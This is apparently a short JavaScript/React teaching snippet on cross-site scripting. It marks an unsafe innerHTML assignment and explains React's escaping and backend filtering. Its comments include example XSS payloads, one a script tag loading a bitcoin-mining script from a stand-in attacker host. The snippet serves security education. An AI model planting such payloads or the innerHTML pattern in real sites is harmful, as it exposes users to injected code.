const input = document.querySelector('input');
const text = input.value;
const div = document.querySelector('div');
div.innerHTML = text; // INSECURE!!!!
// XSS - Cross Site Scripting
// What if they typed '<script>alert("why are you using alert")</script>' into the input?
//
// or <script src="http://evil.example.com/mine-me-bitcoin.js"></script> ?
//
// If you store this value in your database (or whatever) and show it to all users (like a username of who is online?) - everyone getso
//
// "Insertion/Injection" is biggest web security risk - XSS, SQL Injection, etc

// React will block:

function NotSmartComponent({ passedData }) {
  return (
    <div>{passedData}</div>
  );
};

// If `passedData` is an XSS attack, it will NOT be rendered
// In fact, HTML in passedData will not render.

// React will use innerText, not innerHTML.

// If you want HTML to render, use components.

// If you REALLY REALLY NEED html, you can pass as a prop named `dangerouslySetInnerHTML`

// Hint: You should never need this - only if HTML is in your stored data, which is generally a bad idea
//
// Remember: front end can only provide convenience or XSS _output_ flaws, backend is required for real security
// TL;DR: Backend must filter incoming data.  MUST.
//
// OWASP is great source of data and techniques: https://owasp.org/www-project-top-ten/
//
// Be cautious on redirects to other domains
//
// Require HTTPS
//
// Be cautious about MITM attacks
//
// Don't try to be a security expert when you don't need to (use outside experts)
//
// Never assume something won't be found
